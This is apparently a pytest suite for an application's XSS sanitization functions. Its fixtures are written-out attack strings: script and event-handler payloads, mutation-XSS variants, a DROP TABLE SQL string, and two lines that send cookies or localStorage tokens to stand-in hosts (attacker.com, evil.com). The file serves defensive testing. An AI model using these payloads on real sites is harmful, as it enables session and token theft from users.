"""
T.A.R.S. Sanitization Tests
Unit tests for XSS sanitization utilities
"""

import pytest
from app.core.sanitize import (
    sanitize_error_message,
    sanitize_string,
    sanitize_dict,
    sanitize_response_data,
    sanitize_user_input,
    sanitize_log_message,
)


class TestSanitizeErrorMessage:
    """Test sanitize_error_message function"""

    def test_basic_script_tag_removal(self):
        """Test removal of basic script tags"""
        message = "<script>alert('XSS')</script>Error occurred"
        result = sanitize_error_message(message)
        assert "<script>" not in result
        assert "alert" not in result
        assert "XSS" not in result

    def test_html_encoding(self):
        """Test HTML entity encoding"""
        message = "User <b>admin</b> not found"
        result = sanitize_error_message(message)
        assert "&lt;b&gt;" in result
        assert "&lt;/b&gt;" in result
        assert "<b>" not in result

    def test_none_input(self):
        """Test handling of None input"""
        result = sanitize_error_message(None)
        assert result == ""

    def test_non_string_input(self):
        """Test handling of non-string inputs"""
        result = sanitize_error_message(404)
        assert result == "404"

        result = sanitize_error_message(3.14)
        assert result == "3.14"

        result = sanitize_error_message(True)
        assert result == "True"

    def test_empty_string(self):
        """Test handling of empty strings"""
        result = sanitize_error_message("")
        assert result == ""

        result = sanitize_error_message("   ")
        assert result == ""

    def test_script_tag_variations(self):
        """Test removal of various script tag formats"""
        test_cases = [
            "<script>alert(1)</script>",
            "<SCRIPT>alert(1)</SCRIPT>",
            "<ScRiPt>alert(1)</ScRiPt>",
            "<script type='text/javascript'>alert(1)</script>",
            "<script src='evil.js'></script>",
        ]

        for test_case in test_cases:
            result = sanitize_error_message(test_case)
            assert "<script" not in result.lower()
            assert "alert" not in result

    def test_event_handler_removal(self):
        """Test removal of event handlers"""
        test_cases = [
            "<img src=x onerror='alert(1)'>",
            "<div onclick='alert(1)'>Click me</div>",
            "<body onload='alert(1)'>",
            "<a href='#' onmouseover='alert(1)'>Link</a>",
        ]

        for test_case in test_cases:
            result = sanitize_error_message(test_case)
            assert "onerror" not in result.lower()
            assert "onclick" not in result.lower()
            assert "onload" not in result.lower()
            assert "onmouseover" not in result.lower()

    def test_javascript_protocol_removal(self):
        """Test removal of javascript: protocol"""
        message = "<a href='javascript:alert(1)'>Click</a>"
        result = sanitize_error_message(message)
        assert "javascript:" not in result.lower()

    def test_iframe_removal(self):
        """Test removal of iframe tags"""
        message = "<iframe src='evil.com'></iframe>Safe content"
        result = sanitize_error_message(message)
        assert "<iframe" not in result.lower()
        assert "evil.com" not in result

    def test_object_embed_removal(self):
        """Test removal of object and embed tags"""
        test_cases = [
            "<object data='evil.swf'></object>",
            "<embed src='evil.swf'>",
        ]

        for test_case in test_cases:
            result = sanitize_error_message(test_case)
            assert "<object" not in result.lower()
            assert "<embed" not in result.lower()

    def test_nested_tags(self):
        """Test handling of nested malicious tags"""
        message = "<div><script>alert(1)</script><b>Text</b></div>"
        result = sanitize_error_message(message)
        assert "<script>" not in result
        assert "alert" not in result

    def test_safe_text_preserved(self):
        """Test that safe text is preserved"""
        message = "This is a safe error message"
        result = sanitize_error_message(message)
        assert result == message

    def test_special_characters_encoded(self):
        """Test that special characters are properly encoded"""
        message = "Error: <value> & <other_value>"
        result = sanitize_error_message(message)
        assert "&lt;value&gt;" in result
        assert "&amp;" in result

    def test_multiline_script_removal(self):
        """Test removal of multiline script tags"""
        message = """<script>
            var x = 'evil';
            alert(x);
        </script>Safe text"""
        result = sanitize_error_message(message)
        assert "<script>" not in result
        assert "alert" not in result
        assert "evil" not in result


class TestSanitizeDict:
    """Test sanitize_dict function"""

    def test_basic_dict_sanitization(self):
        """Test basic dictionary sanitization"""
        data = {
            "error": "<script>alert('XSS')</script>",
            "code": 500
        }
        result = sanitize_dict(data)
        assert "<script>" not in result["error"]
        assert result["code"] == 500

    def test_nested_dict_sanitization(self):
        """Test nested dictionary sanitization"""
        data = {
            "user": {
                "name": "<b>admin</b>",
                "id": 123
            },
            "status": "active"
        }
        result = sanitize_dict(data)
        assert "&lt;b&gt;" in result["user"]["name"]
        assert result["user"]["id"] == 123

    def test_list_in_dict_sanitization(self):
        """Test sanitization of lists within dictionaries"""
        data = {
            "messages": [
                "<script>xss</script>",
                "normal text"
            ],
            "count": 2
        }
        result = sanitize_dict(data)
        assert "<script>" not in result["messages"][0]
        assert result["messages"][1] == "normal text"
        assert result["count"] == 2

    def test_none_values_preserved(self):
        """Test that None values are preserved"""
        data = {
            "error": None,
            "code": 200
        }
        result = sanitize_dict(data)
        assert result["error"] is None
        assert result["code"] == 200

    def test_none_input(self):
        """Test handling of None input"""
        result = sanitize_dict(None)
        assert result == {}

    def test_non_dict_input_raises_error(self):
        """Test that non-dict input raises ValueError"""
        with pytest.raises(ValueError):
            sanitize_dict("not a dict")

        with pytest.raises(ValueError):
            sanitize_dict([1, 2, 3])

    def test_max_depth_protection(self):
        """Test protection against excessive recursion"""
        # Create deeply nested structure
        data = {"level1": {"level2": {"level3": {"level4": {"level5": {
            "level6": {"level7": {"level8": {"level9": {"level10": {
                "level11": "deep value"
            }}}}}}}}}}

        # Should not raise recursion error with max_depth
        result = sanitize_dict(data, max_depth=5)
        assert result is not None

    def test_mixed_types_in_dict(self):
        """Test dictionary with mixed value types"""
        data = {
            "string": "<script>xss</script>",
            "int": 42,
            "float": 3.14,
            "bool": True,
            "none": None,
            "list": ["<b>item</b>", 123],
            "dict": {"nested": "<i>text</i>"}
        }
        result = sanitize_dict(data)
        assert "<script>" not in result["string"]
        assert result["int"] == 42
        assert result["float"] == 3.14
        assert result["bool"] is True
        assert result["none"] is None
        assert "&lt;b&gt;" in result["list"][0]
        assert result["list"][1] == 123
        assert "&lt;i&gt;" in result["dict"]["nested"]

    def test_dict_keys_sanitization(self):
        """Test that dictionary keys are also sanitized"""
        data = {
            "<script>key</script>": "value"
        }
        result = sanitize_dict(data)
        # Keys should be sanitized too
        assert any("<script>" not in str(key) for key in result.keys())

    def test_empty_dict(self):
        """Test empty dictionary"""
        result = sanitize_dict({})
        assert result == {}

    def test_complex_nested_structure(self):
        """Test complex nested structure with lists and dicts"""
        data = {
            "users": [
                {
                    "name": "<script>alert(1)</script>John",
                    "emails": ["<b>john@test.com</b>"],
                    "metadata": {
                        "bio": "<i>Developer</i>"
                    }
                },
                {
                    "name": "Jane",
                    "emails": ["jane@test.com"],
                    "metadata": {
                        "bio": "Designer"
                    }
                }
            ],
            "count": 2
        }
        result = sanitize_dict(data)
        assert "<script>" not in result["users"][0]["name"]
        assert "&lt;b&gt;" in result["users"][0]["emails"][0]
        assert "&lt;i&gt;" in result["users"][0]["metadata"]["bio"]
        assert result["users"][1]["name"] == "Jane"
        assert result["count"] == 2


class TestSanitizeResponseData:
    """Test sanitize_response_data function"""

    def test_sanitize_dict_response(self):
        """Test sanitizing dictionary response"""
        data = {"error": "<script>xss</script>"}
        result = sanitize_response_data(data)
        assert isinstance(result, dict)
        assert "<script>" not in result["error"]

    def test_sanitize_list_response(self):
        """Test sanitizing list response"""
        data = ["<script>xss</script>", "safe text"]
        result = sanitize_response_data(data)
        assert isinstance(result, list)
        assert "<script>" not in result[0]
        assert result[1] == "safe text"

    def test_sanitize_string_response(self):
        """Test sanitizing string response"""
        data = "<script>alert(1)</script>Text"
        result = sanitize_response_data(data)
        assert isinstance(result, str)
        assert "<script>" not in result

    def test_primitive_types_preserved(self):
        """Test that primitive types are preserved"""
        assert sanitize_response_data(42) == 42
        assert sanitize_response_data(3.14) == 3.14
        assert sanitize_response_data(True) is True
        assert sanitize_response_data(None) is None

    def test_tuple_response(self):
        """Test sanitizing tuple response"""
        data = ("<script>xss</script>", "safe", 123)
        result = sanitize_response_data(data)
        assert isinstance(result, list)  # Tuples are converted to lists
        assert "<script>" not in result[0]
        assert result[1] == "safe"
        assert result[2] == 123


class TestSanitizeUserInput:
    """Test sanitize_user_input function"""

    def test_user_input_sanitization(self):
        """Test user input sanitization"""
        user_input = "<script>alert('hack')</script>My input"
        result = sanitize_user_input(user_input)
        assert "<script>" not in result
        assert "alert" not in result

    def test_none_user_input(self):
        """Test None user input"""
        result = sanitize_user_input(None)
        assert result == ""


class TestSanitizeLogMessage:
    """Test sanitize_log_message function"""

    def test_log_message_sanitization(self):
        """Test log message sanitization"""
        message = "<script>alert(1)</script>Log entry"
        result = sanitize_log_message(message)
        assert "<script>" not in result

    def test_newline_removal(self):
        """Test removal of newlines to prevent log injection"""
        message = "Line 1\nLine 2\rLine 3"
        result = sanitize_log_message(message)
        assert "\n" not in result
        assert "\r" not in result
        assert "Line 1 Line 2 Line 3" in result

    def test_multiple_spaces_collapsed(self):
        """Test that multiple spaces are collapsed"""
        message = "Text    with     many      spaces"
        result = sanitize_log_message(message)
        assert "    " not in result
        assert "Text with many spaces" == result

    def test_log_injection_prevention(self):
        """Test prevention of log injection attacks"""
        # Attacker tries to inject fake log entries
        message = "Normal log\n[ERROR] Fake error injected by attacker"
        result = sanitize_log_message(message)
        # Newlines should be removed, preventing the fake log entry
        assert "\n" not in result
        assert "Normal log [ERROR] Fake error injected by attacker" in result


class TestEdgeCases:
    """Test edge cases and error handling"""

    def test_very_long_string(self):
        """Test handling of very long strings"""
        long_string = "<script>" + ("A" * 10000) + "</script>"
        result = sanitize_error_message(long_string)
        assert "<script>" not in result

    def test_unicode_characters(self):
        """Test handling of Unicode characters"""
        message = "Error: 你好 <script>alert(1)</script> مرحبا"
        result = sanitize_error_message(message)
        assert "你好" in result
        assert "مرحبا" in result
        assert "<script>" not in result

    def test_malformed_html(self):
        """Test handling of malformed HTML"""
        test_cases = [
            "<script>alert(1)",  # Unclosed tag
            "script>alert(1)</script>",  # Missing opening bracket
            "<scr<script>ipt>alert(1)</script>",  # Nested weird tags
        ]

        for test_case in test_cases:
            result = sanitize_error_message(test_case)
            # Should not crash and should sanitize what it can
            assert result is not None
            assert isinstance(result, str)

    def test_null_bytes(self):
        """Test handling of null bytes"""
        message = "Text\x00with\x00null\x00bytes"
        result = sanitize_error_message(message)
        assert result is not None
        assert isinstance(result, str)

    def test_repeated_sanitization(self):
        """Test that repeated sanitization doesn't corrupt data"""
        message = "Safe text with <b>HTML</b>"
        result1 = sanitize_error_message(message)
        result2 = sanitize_error_message(result1)
        result3 = sanitize_error_message(result2)
        # Results should be stable after first sanitization
        assert result1 == result2 == result3

    def test_object_with_dict_attribute(self):
        """Test sanitization of objects with __dict__ attribute"""
        class MockObject:
            def __init__(self):
                self.name = "<script>xss</script>"
                self.value = 42

        obj = MockObject()
        result = sanitize_dict(obj)
        assert isinstance(result, dict)
        assert "<script>" not in result["name"]
        assert result["value"] == 42


class TestRealWorldScenarios:
    """Test real-world XSS attack scenarios"""

    def test_reflected_xss_attack(self):
        """Test prevention of reflected XSS attack"""
        # Simulated user input in URL parameter
        user_input = "<script>document.location='http://attacker.com?cookie='+document.cookie</script>"
        result = sanitize_error_message(user_input)
        assert "<script>" not in result
        assert "document.location" not in result

    def test_stored_xss_attack(self):
        """Test prevention of stored XSS attack"""
        # Simulated stored comment/post
        comment = "Great article! <img src=x onerror='fetch(\"http://evil.com?data=\"+localStorage.getItem(\"token\"))'>"
        result = sanitize_error_message(comment)
        assert "onerror" not in result.lower()
        assert "fetch" not in result

    def test_dom_based_xss_attack(self):
        """Test prevention of DOM-based XSS attack"""
        input_data = {
            "search_query": "<img src=x onerror='eval(atob(\"YWxlcnQoMSk=\"))'>",
            "user_name": "<svg/onload=alert(1)>"
        }
        result = sanitize_dict(input_data)
        assert "onerror" not in str(result).lower()
        assert "onload" not in str(result).lower()
        assert "eval" not in str(result)

    def test_mutation_xss_attack(self):
        """Test prevention of mutation XSS attack"""
        # These exploit browser parser differences
        test_cases = [
            "<noscript><p title=\"</noscript><img src=x onerror=alert(1)>\">",
            "<listing>&lt;img src=x onerror=alert(1)&gt;</listing>",
            "<style><img src=\"</style><img src=x onerror=alert(1)//>",
        ]

        for test_case in test_cases:
            result = sanitize_error_message(test_case)
            assert "onerror" not in result.lower()
            assert "alert" not in result

    def test_sql_injection_with_xss(self):
        """Test combined SQL injection + XSS attack"""
        malicious_input = "'; DROP TABLE users; --<script>alert('XSS')</script>"
        result = sanitize_error_message(malicious_input)
        # Should remove XSS but preserve SQL-like syntax (not SQL sanitization's job)
        assert "<script>" not in result
        assert "alert" not in result

    def test_json_injection_attack(self):
        """Test JSON structure in error messages"""
        error_data = {
            "error": '{"message":"<script>alert(1)</script>"}',
            "user_data": {
                "profile": "<img src=x onerror=alert(1)>"
            }
        }
        result = sanitize_dict(error_data)
        assert "<script>" not in str(result)
        assert "onerror" not in str(result).lower()


class TestPerformance:
    """Test performance characteristics"""

    def test_large_dict_sanitization(self):
        """Test sanitization of large dictionaries"""
        large_dict = {
            f"key_{i}": f"<script>alert({i})</script>value_{i}"
            for i in range(1000)
        }
        result = sanitize_dict(large_dict)
        assert len(result) == 1000
        assert all("<script>" not in v for v in result.values())

    def test_deeply_nested_sanitization_performance(self):
        """Test performance with deeply nested structures"""
        # Create nested structure
        nested = {"value": "<script>xss</script>"}
        for i in range(8):  # 8 levels deep (within max_depth of 10)
            nested = {"level": nested}

        result = sanitize_dict(nested)
        assert result is not None
